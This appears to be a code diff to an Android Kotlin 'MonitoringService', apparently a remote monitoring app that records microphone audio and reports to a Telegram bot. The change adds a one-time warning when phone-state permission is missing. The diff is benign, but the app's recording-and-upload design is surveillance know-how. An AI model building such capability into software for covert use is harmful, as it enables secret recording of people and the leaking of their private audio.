@@ -131,6 +131,7 @@ class MonitoringService : Service() {
     private val ringBusy = AtomicBoolean(false)
     private val recordBusy = AtomicBoolean(false)
     private val recorderActive = AtomicBoolean(false)
+    private val phoneStateWarned = AtomicBoolean(false)
     @Volatile
     private var recordingKind = ""
     private val audioFlushBusy = java.util.concurrent.atomic.AtomicBoolean(false)
@@ -12147,6 +12148,16 @@ class MonitoringService : Service() {
         if (!hasMicPermission()) {
             sendToTelegram("⚠️ Izin Mikrofon belum diberikan. Buka Setup dan berikan izin Mikrofon.")
             return
+        }
+        // Deteksi panggilan mati tanpa izin (issue #1463):
+        // callInProgressNow mengembalikan false bila izin
+        // status telepon tak ada — perlindungan itu dulu
+        // mati SENYAP. Kini diperingatkan sekali per proses.
+        if (!hasPhoneStatePermission() && phoneStateWarned.compareAndSet(false, true)) {
+            try {
+                sendToTelegram("ℹ️ Izin Status Telepon belum diberikan — deteksi panggilan saat merekam tidak aktif; rekaman yang menembus panggilan bisa nyaris senyap.")
+            } catch (_: Exception) {
+            }
         }
         if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) {
             sendToTelegram("Dibatasi Telegram (rate limit) — rekaman ditahan lalu dicoba lagi.")
